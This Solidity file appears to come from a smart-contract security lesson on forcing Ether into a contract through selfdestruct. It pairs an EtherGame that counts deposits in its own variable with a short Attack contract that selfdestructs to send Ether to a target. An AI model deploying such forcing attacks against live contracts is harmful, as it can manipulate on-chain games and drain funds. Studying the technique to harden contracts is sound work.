// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
Forcing Ether with selfdestruct
Code
Preventative techniques
*/

contract Foo {
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Bar {
    function kill(address payable addr) public payable {
        selfdestruct(addr);
    }
}

contract EtherGame {
    uint public balance;
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        balance += msg.value;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    function attack(address payable _target) public payable {
        selfdestruct(_target);
    }
}